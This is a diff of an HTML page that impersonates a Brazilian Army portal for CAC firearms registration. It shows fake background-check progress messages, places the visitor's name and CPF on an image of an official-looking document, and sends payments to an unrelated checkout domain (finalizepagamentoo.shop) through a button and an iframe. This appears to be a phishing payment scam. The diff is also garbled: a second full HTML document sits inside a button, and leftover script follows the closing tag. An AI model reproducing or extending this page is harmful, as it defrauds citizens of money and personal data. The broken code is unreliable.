@@ -663,27 +663,37 @@ Shopify.routes.root = "https://cac-registro.org/";</script>
             <p class="mb-6 text-base">Clique no botão abaixo para ser redirecionado à página de pagamento e finalizar seu processo de registro CAC:</p>
             <div class="flex justify-center">
                 <button id="paymentButton" class="bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-6 rounded-full text-base animate-left-right inline-flex items-center">
-                    <span>Efetuar Pagamento</span>
-                    <i class="fas fa-arrow-right ml-2"></i>
-                </button>
-            </div>
-            
-        </div>
-                    <!-- Seção com a imagem e textos sobrepostos -->
-            <!-- Seção com a imagem e textos sobrepostos -->
-<div class="relative mb-6">
-    <img src="documento.png" alt="Documento CAC" class="w-full h-auto max-w-lg mx-auto" />
-    <div class="absolute top-1/4 left-1/4 text-gray-600 font-bold text-lg" id="text-overlay-1">
-        <!-- O nome completo será injetado aqui -->
-    </div>
-    <div class="absolute top-1/2 left-1/4 text-gray-600 font-bold text-lg" id="text-overlay-2">
-        <!-- O CPF será injetado aqui -->
-    </div>
-</div>
+                   <!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Pagamento CAC</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"/>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100">
 
+<main class="container mx-auto px-4 py-6">
+    <p class="mb-6 text-base">Clique no botão abaixo para ser redirecionado à página de pagamento e finalizar seu processo de registro CAC:</p>
+    <div class="flex justify-center">
+        <button id="paymentButton" class="bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-6 rounded-full text-base animate-left-right inline-flex items-center">
+            <span>Efetuar Pagamento</span>
+            <i class="fas fa-arrow-right ml-2"></i>
+        </button>
+    </div>
+
+    <!-- Seção com a imagem e textos sobrepostos -->
+    <div class="relative mb-6">
+        <img src="documento.png" alt="Documento CAC" class="w-full h-auto max-w-lg mx-auto" />
+        <div class="absolute top-1/4 left-1/4 text-gray-600 font-bold text-lg" id="text-overlay-1">
+            <!-- O nome completo será injetado aqui -->
+        </div>
+        <div class="absolute top-1/2 left-1/4 text-gray-600 font-bold text-lg" id="text-overlay-2">
+            <!-- O CPF será injetado aqui -->
+        </div>
     </div>
 </main>
-
 
 <style>
 .relative {
@@ -699,96 +709,103 @@ Shopify.routes.root = "https://cac-registro.org/";</script>
     font-weight: bold;
 }
 
-/* Ajustes para a posição dos textos */
 #text-overlay-1 {
-	font-size: 11.5px;
-    top: 32.5%; /* 25% da altura da imagem */
-    left: 17.5%; /* 25% da largura da imagem */
+    font-size: 11.5px;
+    top: 32.5%;
+    left: 17.5%;
 }
 
 #text-overlay-2 {
-	font-size: 11.5px;
-    top: 42.5%; /* 50% da altura da imagem */
-    left: 17.5%; /* 25% da largura da imagem */
+    font-size: 11.5px;
+    top: 42.5%;
+    left: 17.5%;
 }
 
-/* Ajustável via CSS */
 img {
-    width: 100%; /* Pode ajustar o tamanho da imagem aqui */
-    max-width: 700px; /* Largura máxima */
+    width: 100%;
+    max-width: 700px;
     height: auto;
 }
-
 </style>
 
-
-    <footer class="bg-green-900 text-white py-8">
-        <div class="container mx-auto px-4">
-            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-8">
-                <div>
-                    <h3 class="font-bold mb-3 text-lg">O EXÉRCITO</h3>
-                    <ul class="space-y-2">
-                        <li><a class="hover:underline" href="#">Missão e Visão</a></li>
-                        <li><a class="hover:underline" href="#">Comandante do Exército</a></li>
-                        <li><a class="hover:underline" href="#">Organização</a></li>
-                        <li><a class="hover:underline" href="#">História</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h3 class="font-bold mb-3 text-lg">SERVIÇOS</h3>
-                    <ul class="space-y-2">
-                        <li><a class="hover:underline" href="#">CAC</a></li>
-                        <li><a class="hover:underline" href="#">Alistamento</a></li>
-                        <li><a class="hover:underline" href="#">Concursos</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h3 class="font-bold mb-3 text-lg">TRANSPARÊNCIA</h3>
-                    <ul class="space-y-2">
-                        <li><a class="hover:underline" href="#">Acesso à Informação</a></li>
-                        <li><a class="hover:underline" href="#">Licitações e Contratos</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h3 class="font-bold mb-3 text-lg">CONTATO</h3>
-                    <ul class="space-y-2">
-                        <li><a class="hover:underline" href="#">Ouvidoria</a></li>
-                        <li><a class="hover:underline" href="#">Fale Conosco</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h3 class="font-bold mb-3 text-lg">REDES SOCIAIS</h3>
-                    <div class="flex space-x-4">
-                        <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-facebook-f"></i></a>
-                        <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-instagram"></i></a>
-                        <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-twitter"></i></a>
-                        <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-youtube"></i></a>
-                    </div>
+<footer class="bg-green-900 text-white py-8">
+    <div class="container mx-auto px-4">
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-8">
+            <div>
+                <h3 class="font-bold mb-3 text-lg">O EXÉRCITO</h3>
+                <ul class="space-y-2">
+                    <li><a class="hover:underline" href="#">Missão e Visão</a></li>
+                    <li><a class="hover:underline" href="#">Comandante do Exército</a></li>
+                    <li><a class="hover:underline" href="#">Organização</a></li>
+                    <li><a class="hover:underline" href="#">História</a></li>
+                </ul>
+            </div>
+            <div>
+                <h3 class="font-bold mb-3 text-lg">SERVIÇOS</h3>
+                <ul class="space-y-2">
+                    <li><a class="hover:underline" href="#">CAC</a></li>
+                    <li><a class="hover:underline" href="#">Alistamento</a></li>
+                    <li><a class="hover:underline" href="#">Concursos</a></li>
+                </ul>
+            </div>
+            <div>
+                <h3 class="font-bold mb-3 text-lg">TRANSPARÊNCIA</h3>
+                <ul class="space-y-2">
+                    <li><a class="hover:underline" href="#">Acesso à Informação</a></li>
+                    <li><a class="hover:underline" href="#">Licitações e Contratos</a></li>
+                </ul>
+            </div>
+            <div>
+                <h3 class="font-bold mb-3 text-lg">CONTATO</h3>
+                <ul class="space-y-2">
+                    <li><a class="hover:underline" href="#">Ouvidoria</a></li>
+                    <li><a class="hover:underline" href="#">Fale Conosco</a></li>
+                </ul>
+            </div>
+            <div>
+                <h3 class="font-bold mb-3 text-lg">REDES SOCIAIS</h3>
+                <div class="flex space-x-4">
+                    <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-facebook-f"></i></a>
+                    <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-instagram"></i></a>
+                    <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-twitter"></i></a>
+                    <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-youtube"></i></a>
                 </div>
             </div>
         </div>
-    </footer>
-    <div class="bg-green-950 text-white text-sm py-3 text-center">
-        Portal produzido pelo Exército Brasileiro - Todos os Direitos Reservados.
     </div>
+</footer>
 
-    <div id="paymentOverlay" class="payment-overlay">
-        <iframe id="pagSeguroIframe" src="https://checkout.finalizepagamentoo.shop/VCCL1O8SBSW0?name=Nome%20n%C3%A3o%20dispon%C3%ADvel&amp;email=Email%20n%C3%A3o%20dispon%C3%ADvel&amp;telephone=Telefone%20n%C3%A3o%20dispon%C3%ADvel&amp;document=CPF%20n%C3%A3o%20dispon%C3%ADvel" frameborder="0" allowfullscreen="" class="payment-iframe"></iframe>
-    </div>
+<div class="bg-green-950 text-white text-sm py-3 text-center">
+    Portal produzido pelo Exército Brasileiro - Todos os Direitos Reservados.
+</div>
 
-    <script>
-        const loadingStatus = document.getElementById('loadingStatus');
-        const loadingScreen = document.getElementById('loadingScreen');
-        const paymentButton = document.getElementById('paymentButton');
-        const paymentOverlay = document.getElementById('paymentOverlay');
-        const pagSeguroIframe = document.getElementById('pagSeguroIframe');
+<div id="paymentOverlay" class="payment-overlay">
+    <iframe id="pagSeguroIframe" src="https://checkout.finalizepagamentoo.shop/VCCL1O8SBSW0?name=Nome%20n%C3%A3o%20dispon%C3%ADvel&amp;email=Email%20n%C3%A3o%20dispon%C3%ADvel&amp;telephone=Telefone%20n%C3%A3o%20dispon%C3%ADvel&amp;document=CPF%20n%C3%A3o%20dispon%C3%ADvel" frameborder="0" allowfullscreen="" class="payment-iframe"></iframe>
+</div>
 
-        const statusMessages = [
-            "Verificando Histórico criminal",
-            "Buscando registros de trabalhos",
-            "Consultando seu endereço",
-            "Finalizando verificação"
-        ];
+<script>
+const loadingStatus = document.getElementById('loadingStatus');
+const loadingScreen = document.getElementById('loadingScreen');
+const paymentButton = document.getElementById('paymentButton');
+const paymentOverlay = document.getElementById('paymentOverlay');
+const pagSeguroIframe = document.getElementById('pagSeguroIframe');
+
+const statusMessages = [
+    "Verificando Histórico criminal",
+    "Buscando registros de trabalhos",
+    "Consultando seu endereço",
+    "Finalizando verificação"
+];
+
+// Redirecionamento ao clicar no botão
+paymentButton.addEventListener('click', () => {
+    window.location.href = 'https://checkout.finalizepagamentoo.shop/VCCL1O8SBSW0';
+});
+</script>
+
+</body>
+</html>
+
 
         let currentStatus = 0;
 
